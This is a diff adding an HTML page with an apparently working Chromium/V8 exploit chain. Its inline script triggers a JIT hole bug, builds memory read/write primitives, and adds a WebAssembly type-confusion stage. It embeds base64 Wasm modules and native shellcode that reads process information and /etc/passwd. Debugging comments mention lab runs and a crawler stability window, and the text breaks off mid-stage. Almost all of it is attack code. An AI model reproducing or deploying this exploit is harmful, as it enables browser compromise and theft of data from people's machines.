@@ -1,0 +1,1000 @@
+<!doctype html><meta charset="utf-8">
+<script>(async function(){
+  window.__result = 'stage:enter';
+  const LOG = [];
+  // IMPORTANT: beacons must NOT block or pump the message loop. A sync XHR
+  // enters a nested pump; with the corrupted heap, a pumped task deadlocks
+  // the main thread in futex_wait_queue (runs 15:36-15:57: renderer alive,
+  // beacons stop mid-run, CDP evaluate blocked). sendBeacon queues via Mojo
+  // and returns immediately.
+  function slog(s){ LOG.push(s); window.__result = JSON.stringify(LOG.slice(-16));
+    try { navigator.sendBeacon('/st?m=' + encodeURIComponent(s)); } catch(e){} }
+  try {
+  window.__cageDonors = [];
+  const donorSizes = [0x1000, 0x4000, 0x10000, 0x40000];
+  for (let di = 0; di < donorSizes.length; di++) {
+    const donor = new Array(donorSizes[di]);
+    donor.fill(1.25);
+    window.__cageDonors.push(donor);
+  }
+  const ab = new ArrayBuffer(8);
+  const f64 = new Float64Array(ab);
+  const u32 = new Uint32Array(ab);
+  const big = new BigUint64Array(ab);
+  function f2b(f){ f64[0]=f; return big[0]; }
+  function b2f(b){ big[0]=b; return f64[0]; }
+  function lo(f){ f64[0]=f; return u32[0]; }
+  function hi(f){ f64[0]=f; return u32[1]; }
+  function mk(l,h){ u32[0]=l>>>0; u32[1]=h>>>0; return f64[0]; }
+  slog('enter');
+  let ROPCHAIN = null, ROPPAY = null, ROP_MEMORY = null;
+
+  function hax(trigger) {
+    let x;
+    delete x?.[y]?.a;
+    let hole = y;
+    let y;
+    let o = {};
+    o.maybe_hole = trigger ? hole : "not the hole";
+    let len = o.maybe_hole.length;
+    let sign = Math.sign(len);
+    let i1 = 2 - (sign + 1);
+    let i2 = 5 - (i1 + 4) >> 1;
+    let i3 = 1 * i2 + 1;
+    let i4 = i3 * 100;
+    let arr = new Array(8);
+    arr[0] = 13.37;
+    arr[i4] = 13.37;
+    return arr;
+  }
+
+
+
+  // ==== primitive design v3 (lab-validated 2026-10-12) ====
+  // corrupted: JSArray len=101, elements FDA capacity=8 (verified via gdb
+  // memory dump). OOB STORES past capacity land on live neighbour objects;
+  // the fake-header bytes later reach the scavenger -> int3 abort mid-GC
+  // (gdb traps at 0x6a9b9fd: HeapNumber->int + bounds check in an embedded
+  // builtin; every "wedge"/futex deadlocks was this). Therefore:
+  //  - the fake JSArray header lives in corrupted's OWN slots 6-7 (bytes
+  //    48..63): in-capacity stores only, never a neighbour, GC-safe (FDA
+  //    data is never scanned as pointers).
+  //  - fake.elements is retargeted via byte 56 (slot 7 low half) - also
+  //    in-capacity.
+  //  - the obj_arr slot scan is LIVENESS-VERIFIED: JS-store a unique Smi
+  //    into obj_arr[0] and confirm the candidate view offset changes with
+  // OOB-store rule (gdb traps 16:12-16:31: rcx=8/capacity, r11=index>=8,
+  // r8=101/length): corrupted[k]= with k >= FDA capacity 8 stores RAW via
+  // the runtime on a store site's FIRST execution (IC miss) - that is how
+  // fakeobj/ok1/ok2 ever worked - but once the site caches a fast handler,
+  // k >= 8 hits the capacity SBXCHECK => int3 abort. Megamorphic warming
+  // did NOT prevent the cached-handler trap (16:31). So: PREBUILT fresh
+  // store sites, each used EXACTLY ONCE. The runtime path also canonicalizes
+  // NaN payloads, so every stored double must be non-NaN (LEN 0x40000000).
+  const storeFns = [];
+  for (let i = 0; i < 512; i++) storeFns.push(Function('a', 'k', 'v', 'a[k]=v;/*' + i + '*/')); // unique source per site (compilation cache shares feedback vectors between identical sources)
+  let storeIdx = 0;
+  function rawStore(a, k, v){ if (storeIdx < storeFns.length) storeFns[storeIdx++](a, k, v); }
+  function wr32(byteOff, val) {           // only byteOff < 64 (in-capacity) or el0Off (fakeobj)
+    const s = byteOff >> 3, ph = (byteOff & 4) ? 1 : 0;
+    const cur = corrupted[s];
+    rawStore(corrupted, s, ph === 0 ? mk(val, hi(cur)) : mk(lo(cur), val));
+  }
+  //  - NO marker array in the view is needed at all.
+  const FAKE_OFF = 48;                    // bytes 48..63 = slots 6..7
+  const ELEM_OFF = 56;                    // fake.elements field (slot 7 low)
+  const LEN_OFF  = 60;                    // fake.length field (slot 7 high)
+  const MAGICV = 0x2a2a2a2a;              // Smi parked in obj_arr[0]
+  const MAGICT = 0x54545454;              // its tagged word in the view
+  let corrupted = null, dbl_arr = null, o1 = null, o2 = null, obj_arr = null;
+  let el0Off = -1, corrOff = -1;
+  let jsarrMap = 0, emptyProps = 0, viewBaseAbs = 0, cageBaseAbs = 0;
+
+  function rd32(byteOff) {
+    const s = byteOff >> 3, ph = (byteOff & 4) ? 1 : 0;
+    return ph === 0 ? lo(corrupted[s]) : hi(corrupted[s]);
+  }
+  // liveness-verified obj_arr elements[0] slot: obj_arr[0] holds MAGIC when
+  // called; every candidate offset is tested by storing a fresh unique Smi
+  // through JS (writes the LIVE array only) and re-reading the offset.
+  function findSlotLive() {
+    obj_arr[0] = MAGICV;
+    for (let i = 0; i < 101; i++) {
+      const a = i * 8, b = i * 8 + 4;
+      if (lo(corrupted[i]) === MAGICT || hi(corrupted[i]) === MAGICT) {
+        const cand = (lo(corrupted[i]) === MAGICT) ? a : b;
+        const probe = 0x1234567 + i;      // unique Smi per candidate
+        obj_arr[0] = probe;
+        const got = (cand & 4) ? hi(corrupted[cand >> 3]) : lo(corrupted[cand >> 3]);
+        if (got === ((probe * 2) >>> 0)) { obj_arr[0] = MAGICV; return cand; }
+      }
+    }
+    obj_arr[0] = MAGICV;
+    return -1;
+  }
+  // anchor: corrupted's own JSArray in view, identity-checked via addrof
+  function findAnchor() {
+    for (let off = 0; off + 16 <= 800; off += 4) {
+      if (rd32(off + 12) === 202 && (rd32(off + 8) & 1) === 1 && (rd32(off + 4) & 1) === 1) {
+        const candBase = ((rd32(off + 8) & ~1) + 8) >>> 0;
+        obj_arr[0] = corrupted; const selfAddr = rd32(el0Off) >>> 0; obj_arr[0] = MAGICV;
+        if (((selfAddr & ~1) >>> 0) === ((candBase + off) >>> 0)) return off;
+      }
+    }
+    return -1;
+  }
+
+  // calibration with RETRY, fresh trigger every attempt. The warmup loop and
+  // every trigger live in this small function so its OSR compile keeps hax
+  // inlined and every hax(true) runs as optimized code (interpreted triggers
+  // die on StoreIC CHECK(the_hole) - fatal dumps 15:19/15:28).
+  const failN = { len: 0, slot: 0, anchor: 0 };
+  let attOk = -1, attCtr = 0;
+  function calibrate(maxAtt) {
+    for (let k = 0; k < maxAtt; k++ , attCtr++) {
+      for (let i = 0; i < 100000; i++) hax(false);   // (re-)OSR so hax stays inlined+optimized
+      corrupted = hax(true);                          // FRESH trigger each attempt
+      if (corrupted.length !== 101) { failN.len++; continue; }
+      o1 = {a: 0x1337}; o2 = {b: 0x4444};
+      obj_arr = [o1, o1, o2, o2];
+      dbl_arr = [1.5, 2.5, 3.5, 4.5, 5.5, 6.5];      // plain data array for ok2
+      el0Off = findSlotLive();
+      if (el0Off < 0) { failN.slot++; continue; }
+      corrOff = findAnchor();
+      if (corrOff < 0) { failN.anchor++; continue; }
+      const da = addrof(dbl_arr);
+      if (da < 0x10000 || (da & 1) !== 1) { failN.slot++; continue; }  // stale-slot garbage
+      jsarrMap = rd32(corrOff) >>> 0;
+      emptyProps = rd32(corrOff + 4) >>> 0;
+      viewBaseAbs = ((rd32(corrOff + 8) & ~1) + 8) >>> 0;
+      return attCtr;
+    }
+    return -1;
+  }
+  // primitives (function declarations hoist above calibrate)
+  function addrof(o) { obj_arr[0] = o; const a = rd32(el0Off) >>> 0; obj_arr[0] = MAGICV; return a; }
+  function fakeobj(addr) { wr32(el0Off, (addr | 1) >>> 0); const o = obj_arr[0]; obj_arr[0] = MAGICV; return o; }
+
+  let fake = null;
+  // re-anchor: allocation-free, GC-safe. Liveness-verified slot + identity-
+  // checked anchor, then REBUILD the fake header in corrupted's OWN slots
+  // 6-7 (in-capacity stores) and repoint elements at the real FDA.
+  function reAnchor() {
+    const e = findSlotLive(); if (e < 0) return false;
+    el0Off = e;
+    const c = findAnchor(); if (c < 0) return false;
+    corrOff = c;
+    jsarrMap = rd32(corrOff) >>> 0;
+    emptyProps = rd32(corrOff + 4) >>> 0;
+    viewBaseAbs = ((rd32(corrOff + 8) & ~1) + 8) >>> 0;
+    cageBaseAbs = viewBaseAbs;
+    wr32(FAKE_OFF, jsarrMap);                       // slot 6 low  = fake.map
+    wr32(FAKE_OFF + 4, emptyProps);                 // slot 6 high = fake.properties
+    wr32(ELEM_OFF, ((viewBaseAbs - 8) | 1) >>> 0);  // slot 7 low  = fake.elements -> REAL FDA
+    wr32(LEN_OFF, 0x40000000);                      // slot 7 high = fake.length Smi 0x20000000; non-NaN so runtime-path stores cannot canonicalize it away
+    fake = fakeobj((viewBaseAbs + FAKE_OFF) >>> 0);
+    return true;
+  }
+
+  attOk = calibrate(8);
+  if (attOk < 0) { slog('FAIL:calib ' + JSON.stringify(failN)); return; }
+  slog('calib-ok att=' + attOk + ' vb=' + viewBaseAbs.toString(16) +
+       ' eOff=' + el0Off + ' cOff=' + corrOff + ' da=' + addrof(dbl_arr).toString(16));
+  // the slog allocations may have scavenged: re-derive everything (each
+  // reAnchor is fully self-healing and writes only in-capacity slots now)
+  if (!reAnchor()) {
+    attOk = calibrate(4);          // fresh triggers after the beacon GC
+    if (attOk < 0 || !reAnchor()) { slog('FAIL:recalib ' + JSON.stringify(failN)); return; }
+  }
+
+  // arb R/W: retarget fake.elements via slot 7 (in-capacity), read/write via
+  // fake[0]. V8's elements-map SBXCHECK reads the map at elements-1: only
+  // REAL FixedDoubleArray-backed addresses may be used as (addr-8)|1.
+  function arbR64(addr) { wr32(ELEM_OFF, ((addr - 8) | 1) >>> 0); return f2b(fake[0]); }
+  function arbW64(addr, bits) { wr32(ELEM_OFF, ((addr - 8) | 1) >>> 0); rawStore(fake, 0, b2f(bits)); }
+
+  // VALIDATION 1: dbl_arr's own JSArray [elements|length] via arb read
+  const dblAddr = addrof(dbl_arr); // tagged
+  const hdr = arbR64(((dblAddr & ~1) + 8) >>> 0);
+  const f_hdr = b2f(hdr);
+  const gotElems = lo(f_hdr) >>> 0, gotLen = hi(f_hdr) >>> 0;
+  const ok1 = ((gotElems & 1) === 1) && gotLen === 12; // 6<<1
+
+  // VALIDATION 2: arb write M2 into dbl_arr[5] through the pointer chain
+  if (ok1) {
+    arbW64((((gotElems & ~1) + 8) + 40) >>> 0, 0x5152535455565758n); // dbl data[5]
+  }
+  const ok2 = ok1 && f2b(dbl_arr[5]) === 0x5152535455565758n;
+  wr32(ELEM_OFF, ((viewBaseAbs - 8) | 1) >>> 0); // park elements back at the real FDA
+
+  // Rebase the forged array onto dbl_arr's genuine FixedDoubleArray backing
+  // store when that data base is lower than the corrupted array's own base.
+  // This keeps V8's elements validation satisfied while extending the
+  // positive-index read window backward.
+  function rebaseCage() {
+    cageBaseAbs = viewBaseAbs;
+    let bestElems = ((viewBaseAbs - 8) | 1) >>> 0;
+    for (let di = 0; di < window.__cageDonors.length; di++) {
+      const donorAddr = addrof(window.__cageDonors[di]) >>> 0;
+      const donorHdr = arbR64(((donorAddr & ~1) + 8) >>> 0);
+      const donorFloat = b2f(donorHdr);
+      const donorElems = lo(donorFloat) >>> 0;
+      const donorLen = hi(donorFloat) >>> 0;
+      const donorBase = (((donorElems & ~1) + 8) >>> 0);
+      if ((donorElems & 1) === 1 && donorLen >= 12 && (donorLen & 1) === 0 &&
+          donorBase < (cageBaseAbs >>> 0)) {
+        bestElems = donorElems;
+        cageBaseAbs = donorBase;
+      }
+    }
+    wr32(ELEM_OFF, bestElems);
+    window.__cageBaseAbs = cageBaseAbs;
+  }
+
+  // ==== Chromium 379140430 intended native AAR/AAW construction ====
+  // Adapted from the public chromium-exploit-dev PoC. The prior f64-only
+  // experiment produced a stack-relative write; the real primitive confuses
+  // i64 with a WasmGC struct reference so struct.get/struct.set dereference an
+  // attacker-supplied native address directly.
+  const TBL_ENTRIES_OFF = 0x0c;
+  const FIXED_ENTRY0_OFF = 0x08;
+  const TUPLE_VALUE2_OFF = 0x08;
+  const TIER_N = parseInt((location.hash.match(/(?:#|&)tier=(\d+)/) || [0, 3000])[1], 10);
+
+  function cageR32(addr) {
+    const aligned = addr & ~7;
+    if ((aligned >>> 0) < (cageBaseAbs >>> 0)) throw Error('arw read below anchor ' + aligned.toString(16));
+    const d = fake[((aligned - cageBaseAbs) >>> 3)];
+    return ((addr & 4) === 0 ? lo(d) : hi(d)) >>> 0;
+  }
+  function cageW32(addr, value) {
+    const aligned = addr & ~7;
+    if ((aligned >>> 0) < (cageBaseAbs >>> 0)) throw Error('arw write below anchor ' + aligned.toString(16));
+    const idx = ((aligned - cageBaseAbs) >>> 3);
+    const d = fake[idx];
+    rawStore(fake, idx, ((addr & 4) === 0) ? mk(value, hi(d)) : mk(lo(d), value));
+  }
+  window.__cageR32 = cageR32;
+  window.__cageW32 = cageW32;
+  function getField(obj, off) { return cageR32((((obj & ~1) + off) >>> 0)); }
+  function setField(obj, off, value) { cageW32((((obj & ~1) + off) >>> 0), value >>> 0); }
+
+  function findPattern(pattern, start, stop) {
+    for (let p = start >>> 0; p !== (stop >>> 0); p = (p + 4) >>> 0) {
+      let match = true;
+      for (let k = 0; k < pattern.length; k++) {
+        if (cageR32((p + k * 4) >>> 0) !== (pattern[k] >>> 0)) { match = false; break; }
+      }
+      if (match) return p >>> 0;
+    }
+    return 0;
+  }
+
+  // Optimized three-word search for [Tuple2Map, instance, Smi(1)]. Scan two
+  // possible 4-byte alignments per 8-byte load without allocating.
+  function findTupleFast(map, instance, start, stop) {
+    let p = ((start + 7) & ~7) >>> 0;
+    for (; p + 16 < (stop >>> 0); p = (p + 8) >>> 0) {
+      const d0 = fake[((p - cageBaseAbs) >>> 3)];
+      const d1 = fake[(((p + 8) - cageBaseAbs) >>> 3)];
+      f64[0] = d0;
+      const d0lo = u32[0] >>> 0, d0hi = u32[1] >>> 0;
+      f64[0] = d1;
+      const d1lo = u32[0] >>> 0, d1hi = u32[1] >>> 0;
+      if (d0lo === (map >>> 0) && d0hi === (instance >>> 0) && d1lo === 2) {
+        return p;
+      }
+      if (d0hi === (map >>> 0) && d1lo === (instance >>> 0) && d1hi === 2) {
+        return (p + 4) >>> 0;
+      }
+    }
+    return 0;
+  }
+
+  function findTupleBackward(map, instance, start, stop) {
+    let p = (start & ~3) >>> 0;
+    const floor = ((stop + 3) & ~3) >>> 0;
+    for (; p >= floor + 8; p = (p - 4) >>> 0) {
+      if (cageR32(p) === (map >>> 0) &&
+          cageR32((p + 4) >>> 0) === (instance >>> 0) &&
+          cageR32((p + 8) >>> 0) === 2) {
+        return p;
+      }
+    }
+    return 0;
+  }
+
+  function tier(func, args) {
+    // Upstream uses 0x50000 calls. This corrupted-heap adaptation makes the
+    // threshold tunable; 3,000 produced a transient wrapper, while 0x50000
+    // can exceed the crawler/lab stability window.
+    for (let i = 0; i < TIER_N; i++) func.apply(null, args);
+  }
+
+  function ensureAnchor(label) {
+    if (reAnchor()) {
+      const probe = addrof(dbl_arr) >>> 0;
+      if (probe > 0x10000 && (probe & 1) === 1) return;
+    }
+    const n = calibrate(6);
+    if (n < 0 || !reAnchor()) throw Error('arw anchor ' + label);
+    const probe = addrof(dbl_arr) >>> 0;
+    if (probe <= 0x10000 || (probe & 1) !== 1) throw Error('arw stale anchor ' + label);
+  }
+
+  function wasmModuleB64(s) {
+    return new WebAssembly.Module(Uint8Array.from(atob(s), c => c.charCodeAt(0)));
+  }
+
+  function confuseSig(exploitB64, sigB64, funcExp, paramN) {
+    const sigModule = wasmModuleB64(sigB64);
+    const exploitModule = wasmModuleB64(exploitB64);
+    const sigImpl = (...v) => v;
+    const exploitImpl = (...v) => v;
+    const sigInstance = new WebAssembly.Instance(sigModule,
+      {import: {func: sigImpl}});
+
+    // Small Wasm objects prefer low old-space free lists. Spray and retain
+    // multiple instances, then use the first candidate whose table metadata
+    // is reachable in the forged array's forward window.
+    const candidates = [];
+    for (let ci = 0; ci < 24; ci++) {
+      const inst = new WebAssembly.Instance(exploitModule,
+        {import: {func_exp: exploitImpl, stage_exp: exploitImpl, memory: ROP_MEMORY}});
+      candidates.push({instance: inst, table: inst.exports.table,
+                       dummy: inst.exports.dummy, tableAddr: 0,
+                       entries: 0, entry0: 0});
+      // Retain a packed-double backing store between Wasm allocations. After
+      // the following scavenges promote it, this gives rebaseCage a genuine
+      // FixedDoubleArray in the same low old-space holes as the table and its
+      // cross-instance call-origin Tuple2.
+      const spacer = new Array(0x80);
+      spacer.fill(1.25 + ci / 1024);
+      window.__cageDonors.push(spacer);
+    }
+    window.__arwCandidates = (window.__arwCandidates || []).concat(candidates);
+
+    ensureAnchor('after candidate instantiate');
+    rebaseCage();
+    // Capture the Tuple2 map from each table's initial placeholder BEFORE
+    // table.set() replaces entry 0 with the cross-instance function.
+    for (const cand of candidates) {
+      cand.instAddr = addrof(cand.instance) >>> 0;
+      const tableAddr = addrof(cand.table) >>> 0;
+      cand.tableAddr = tableAddr;
+      if ((tableAddr & ~1) < cageBaseAbs) continue;
+      const entries = getField(tableAddr, TBL_ENTRIES_OFF) >>> 0;
+      if ((entries & ~1) < cageBaseAbs || (entries & 1) !== 1) continue;
+      const entry0 = getField(entries, FIXED_ENTRY0_OFF) >>> 0;
+      if ((entry0 & ~1) < cageBaseAbs || (entry0 & 1) !== 1) continue;
+      cand.entries = entries;
+      cand.entry0 = entry0;
+      cand.tupleMap = getField(entry0, 0) >>> 0;
+    }
+    let selected = candidates.find(c => c.tupleMap &&
+        ((c.instAddr & ~1) >>> 0) >= (cageBaseAbs >>> 0)) ||
+      candidates.find(c => ((c.tableAddr & ~1) >>> 0) >= (cageBaseAbs >>> 0) &&
+        ((c.instAddr & ~1) >>> 0) >= (cageBaseAbs >>> 0)) ||
+      candidates.find(c => c.tupleMap) ||
+      candidates.find(c => ((c.tableAddr & ~1) >>> 0) >= (cageBaseAbs >>> 0)) || null;
+    const tupleMapHint = selected && selected.tupleMap ? selected.tupleMap : 0x14f5;
+    let tuplePtr = 0;
+    let postEntriesDbg = 0, postEntryDbg = 0, postMapDbg = 0;
+    let postV1Dbg = 0, postV2Dbg = 0;
+    let sentinelEntryDbg = 0;
+    let sigAnchorsDbg = [];
+    if (selected) {
+      // The cross-instance call-origin Tuple2 belongs to the imported
+      // function, not to the destination table entry. Capture every exposed
+      // object on that side before table.set() so we can scan only their
+      // committed 64 KiB old-space blocks instead of walking cage gaps.
+      sigAnchorsDbg = [sigInstance, sigInstance.exports,
+                       sigInstance.exports.func_sig, sigImpl, exploitImpl]
+        .map(o => addrof(o) >>> 0);
+      // Consume the low old-space Tuple2 allocation area with exact same-path
+      // call-origin objects. The last one remains the active call_origin.
+      for (let spray = 0; spray < 12000; spray++) {
+        selected.table.set(0, sigInstance.exports.func_sig);
+      }
+      // table.set may scavenge the addrof carrier, but the retained Wasm
+      // instance is old-space stable. Use the address captured pre-set.
+      const instAddr = selected.instAddr >>> 0;
+
+      // Allocate a sentinel through the same module immediately after the
+      // spray. Its initial table Tuple2 is directly reachable from the table
+      // object and marks the allocator page containing the active call_origin.
+      const sentinel = new WebAssembly.Instance(exploitModule,
+        {import: {func_exp: exploitImpl, stage_exp: exploitImpl, memory: ROP_MEMORY}});
+      window.__arwSentinels = (window.__arwSentinels || []).concat([sentinel]);
+      if (!reAnchor()) throw Error('arw sentinel reanchor');
+      rebaseCage();
+      const sentinelTableAddr = addrof(sentinel.exports.table) >>> 0;
+      let sentinelEntry = 0;
+      if (((sentinelTableAddr & ~1) >>> 0) >= (cageBaseAbs >>> 0)) {
+        const sentinelEntries = getField(sentinelTableAddr, TBL_ENTRIES_OFF) >>> 0;
+        if ((sentinelEntries & 1) === 1 &&
+            ((sentinelEntries & ~1) >>> 0) >= (cageBaseAbs >>> 0)) {
+          sentinelEntry = getField(sentinelEntries, FIXED_ENTRY0_OFF) >>> 0;
+          sentinelEntryDbg = sentinelEntry;
+        }
+      }
+      if ((sentinelEntry & 1) === 1 &&
+          ((sentinelEntry & ~1) >>> 0) >= (cageBaseAbs >>> 0)) {
+        const sentinelBase = (sentinelEntry & ~1) >>> 0;
+        const pageStart = (sentinelBase & ~0x3ffff) >>> 0;
+        const scanFloor = Math.max(cageBaseAbs,
+          pageStart >= 0x40000 ? pageStart - 0x40000 : pageStart) >>> 0;
+        tuplePtr = findTupleBackward(tupleMapHint, instAddr,
+          (sentinelBase - 4) >>> 0, scanFloor);
+      }
+      if (selected.tableAddr) {
+        const postEntries = getField(selected.tableAddr, TBL_ENTRIES_OFF) >>> 0;
+        postEntriesDbg = postEntries;
+        if ((postEntries & 1) === 1 && (postEntries & ~1) >= cageBaseAbs) {
+          const postEntry = getField(postEntries, FIXED_ENTRY0_OFF) >>> 0;
+          postEntryDbg = postEntry;
+          if ((postEntry & 1) === 1 && (postEntry & ~1) >= cageBaseAbs &&
+              ((postMapDbg = getField(postEntry, 0)) & 1) === 1) {
+            postV1Dbg = getField(postEntry, 4) >>> 0;
+            postV2Dbg = getField(postEntry, TUPLE_VALUE2_OFF) >>> 0;
+            if (postMapDbg === tupleMapHint && postV1Dbg === instAddr &&
+                postV2Dbg === 2) tuplePtr = postEntry;
+          }
+        }
+      }
+      // Proven locator from run 11: Tuple2 layout is
+      // [map, value1(instance), value2(Smi(1))]. Search the selected
+      // instance's contiguous old-space burst first.
+      if (!tuplePtr && ((instAddr & ~1) >>> 0) >= (cageBaseAbs >>> 0)) {
+        const nearStart = Math.max(cageBaseAbs, ((instAddr & ~1) - 0x2000) >>> 0) >>> 0;
+        const nearStop = (((instAddr & ~1) + 0x2000) >>> 0);
+        for (let p = (nearStart + 3) & ~3; p < nearStop; p += 4) {
+          if (cageR32(p) === instAddr && cageR32((p + 4) >>> 0) === 2) {
+            tuplePtr = (p - 4) >>> 0;
+            break;
+          }
+        }
+      }
+      if (!tuplePtr && tupleMapHint && selected.entry0) {
+        const blockStart = ((selected.entry0 & ~1) & ~(0x40000 - 1)) >>> 0;
+        const scanStart = Math.max(cageBaseAbs, blockStart) >>> 0;
+        const scanStop = (blockStart + 0x40000) >>> 0;
+        if (scanStart < scanStop) {
+          tuplePtr = findPattern([tupleMapHint, instAddr, 2], scanStart, scanStop);
+        }
+      }
+      if (!tuplePtr && ((selected.tableAddr & ~1) >>> 0) >= cageBaseAbs) {
+        const tb = (selected.tableAddr & ~1) >>> 0;
+        const a0 = Math.max(cageBaseAbs, tb - 0x4000) >>> 0;
+        const a1 = (tb + 0x4000) >>> 0;
+        const p0 = Math.max(((a0 + 3) & ~3) >>> 0,
+                            (cageBaseAbs + 4) >>> 0);
+        for (let p = p0; p + 4 < a1; p += 4) {
+          if (cageR32(p) === instAddr && cageR32((p + 4) >>> 0) === 2 &&
+              (cageR32((p - 4) >>> 0) & 1) === 1) {
+            tuplePtr = (p - 4) >>> 0;
+            break;
+          }
+        }
+      }
+      if (!tuplePtr && tupleMapHint) {
+        const seenRanges = new Set();
+        for (const tagged of [sigAnchorsDbg[0], sigAnchorsDbg[2]]) {
+          const center = (tagged & ~1) >>> 0;
+          const scanStart = Math.max(cageBaseAbs, center - 0x2000) >>> 0;
+          const scanStop = (center + 0x2000) >>> 0;
+          const key = scanStart.toString(16) + ':' + scanStop.toString(16);
+          if (seenRanges.has(key)) continue;
+          seenRanges.add(key);
+          if (scanStart < scanStop) {
+            tuplePtr = findTupleFast(tupleMapHint, instAddr,
+                                     scanStart, scanStop);
+            if (tuplePtr) break;
+          }
+        }
+      }
+    }
+    if (!tuplePtr) {
+      const d0 = (addrof(candidates[0].instance) & ~1) >>> 0;
+      const t0 = (addrof(candidates[0].table) & ~1) >>> 0;
+      const mapTriples = [], v2Two = [];
+      if (selected && selected.tupleMap && selected.entry0) {
+        const bs = ((selected.entry0 & ~1) & ~(0x40000 - 1)) >>> 0;
+        const ss = Math.max(cageBaseAbs, bs) >>> 0;
+        const se = (bs + 0x40000) >>> 0;
+        for (let p = ss; p + 8 < se; p += 4) {
+          if (cageR32(p) !== selected.tupleMap) continue;
+          const mv1 = cageR32((p + 4) >>> 0) >>> 0;
+          const mv2 = cageR32((p + 8) >>> 0) >>> 0;
+          if (mapTriples.length < 6 || p + 0x10000 >= (selected.entry0 & ~1)) {
+            if (mapTriples.length >= 12) mapTriples.shift();
+            mapTriples.push(p.toString(16) + ':' +
+              mv1.toString(16) + ':' + mv2.toString(16));
+          }
+          if (mv2 === 2 && v2Two.length < 8) {
+            v2Two.push(p.toString(16) + ':' + mv1.toString(16));
+          }
+        }
+      }
+      throw Error('arw tuple not found vb=' + viewBaseAbs.toString(16) +
+      ' cb=' + cageBaseAbs.toString(16) +
+      ' sel=' + (selected ? selected.instAddr.toString(16) : '0') +
+      ' d0=' + d0.toString(16) + ' t0=' + t0.toString(16) +
+      ' v2two=' + v2Two.join(',') + ' maps=' + mapTriples.join(',') +
+      ' post=' + postEntriesDbg.toString(16) + ':' +
+        postEntryDbg.toString(16) + ':' + postMapDbg.toString(16) + ':' +
+        postV1Dbg.toString(16) + ':' + postV2Dbg.toString(16) +
+      ' sentinel=' + sentinelEntryDbg.toString(16) +
+      ' sig=' + sigAnchorsDbg.map(x => x.toString(16)).join(',') +
+      ' pre=' + candidates.filter(c => c.tupleMap).slice(0,4).map(c =>
+        c.entry0.toString(16) + ':' + c.tupleMap.toString(16)).join(',') +
+      ' unique=' + (new Set(candidates.map(c => c.instance))).size +
+      ' instances=' + candidates.map(c => addrof(c.instance).toString(16)).join(',') +
+      ' tables=' + candidates.map(c => addrof(c.table).toString(16)).join(',') +
+      ' dummies=' + candidates.map(c => addrof(c.dummy).toString(16)).join(','));
+    }
+
+    const backup = getField(tuplePtr, TUPLE_VALUE2_OFF);
+    setField(tuplePtr, TUPLE_VALUE2_OFF, ((-funcExp - 1) << 1) >>> 0);
+    const args = Array(paramN).fill(0n);
+    tier(selected.dummy, args);
+    // Restore while the same forged-array view is still active. Re-anchoring
+    // first can promote the view above this old-space Tuple2, making the
+    // otherwise safe restoration unreachable.
+    setField(tuplePtr, TUPLE_VALUE2_OFF, backup);
+    ensureAnchor('after tier');
+    return selected.instance;
+  }
+
+  try {
+    // Leak a stable trusted-cage pointer using the exact i64 multi-return form.
+    // Optional old-space pressure for layout experiments. With modules now
+    // compiled once, the earlier unconditional 45MB push is counterproductive:
+    // it promotes the corrupted-array anchor above the subsequent Wasm/Tuple2
+    // burst, outside this primitive's forward-only scan window.
+    const pushN = parseInt((location.hash.match(/(?:#|&)push=(\d+)/) || [0, 1000])[1], 10);
+    window.__arwPush = [];
+    for (let api = 0; api < pushN; api++) {
+      const a = new Array(0x2000); a[0] = api; window.__arwPush.push(a);
+    }
+    slog('ARW push-done n=' + pushN);
+    ROP_MEMORY = new WebAssembly.Memory({initial: 1, maximum: 1});
+    ensureAnchor('after push');
+    const LEAK_EXP_B64 = 'AGFzbQEAAAABaAJgAX4gfn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5gIH5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+IH5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+AiUCBmltcG9ydAZtZW1vcnkCAQEBBmltcG9ydAhmdW5jX2V4cAAAAwMCAAEECwFAAGQBAQEB0gILByEEBm1lbW9yeQIABGxlYWsAAQV0YWJsZQEABWR1bW15AAIKUAIGACAAEAALRwAgACABIAIgAyAEIAUgBiAHIAggCSAKIAsgDCANIA4gDyAQIBEgEiATIBQgFSAWIBcgGCAZIBogGyAcIB0gHiAfQQARAQALABUEbmFtZQEOAgEEbGVhawIFZHVtbXk=';
+    const LEAK_SIG_B64 = 'AGFzbQEAAAABRAFgIH5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+IH5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+Ag8BBmltcG9ydARmdW5jAAAHDAEIZnVuY19zaWcAAA==';
+    const leakInst = confuseSig(LEAK_EXP_B64, LEAK_SIG_B64, 0, 32);
+    const leakVals = leakInst.exports.leak(0n);
+    const nativeLeak = BigInt(leakVals[2]);
+    const META_SC_B64 = 'SIHsACAAAEmJ5bgpAAAAvwIAAAC+AQAAADHSDwWFwA+I6AAAAEGJxLgqAAAARInnSI01KQEAALoQAAAADwWFwA+IxwAAAEiNNSMBAAC6DQAAAOj3AAAASI01UwEAALoABgAA6LAAAABIjTUOAQAAug8AAADo1QAAAEiNNUMBAAC6AAQAAOiOAAAASI01+wAAALoNAAAA6LMAAABMie+4PwAAAA8FhcB4DUyJ7rqGAQAA6JgAAABIjTXcAAAAugsAAADohwAAAEiNPQgBAABMie66AAQAALhZAAAADwWFwH4sicJMie7oYwAAAEiNNbIAAAC6DQAAAOhSAAAASI014gAAALoAEAAA6AsAAAAx/7g8AAAADwUPC1OJ00G6AAAAADHSv5z///+4AQEAAA8FhcB4GYnHTInuidoxwA8FhcB+ConCTInu6AIAAABbw0SJ57gBAAAADwXDDx+AAAAAAAIATPu5x2yZAAAAAAAAAAA9PT1TVEFUVVM9PT0KCj09PUNNRExJTkU9PT0KCj09PVVOQU1FPT09Cgo9PT1FWEU9PT0KCj09PUVYVFJBPT09Ci9wcm9jL3NlbGYvc3RhdHVzAC9wcm9jL3NlbGYvY21kbGluZQAvcHJvYy9zZWxmL2V4ZQAvZXRjL3Bhc3N3ZAA=';
+    const metaBytes = Uint8Array.from(atob(META_SC_B64), c => c.charCodeAt(0));
+    new Uint8Array(ROP_MEMORY.buffer).set(metaBytes);
+
+    // Turn i64 -> i64 into i64 -> structref, then dereference with WasmGC.
